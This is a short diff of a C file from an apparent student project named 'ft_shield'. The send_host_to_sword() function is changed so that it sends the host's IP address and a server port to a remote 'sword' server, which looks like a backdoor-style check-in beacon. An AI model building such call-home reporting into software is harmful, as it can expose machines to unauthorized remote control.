@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:27:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/24 16:31:47 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/25 11:08:36 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -74,7 +74,8 @@ void	send_host_to_sword()
 		return ;
 
 	char	buf[4096];
-	sprintf(buf, "Running ft_shield on %s %s\n", host_buffer, ip_buffer);
+	(void)host_buffer;
+	sprintf(buf, "%s %d", ip_buffer, SERVER_PORT);
 
 	struct sockaddr_in	server_addr;
 	int					socket_fd;
@@ -92,7 +93,7 @@ void	send_host_to_sword()
 		return ;
 	}
 
-	send(socket_fd, buf, strlen(buf), 0);
+	send(socket_fd, buf, strlen(buf) + 1, 0);
 	close(socket_fd);
 }
 
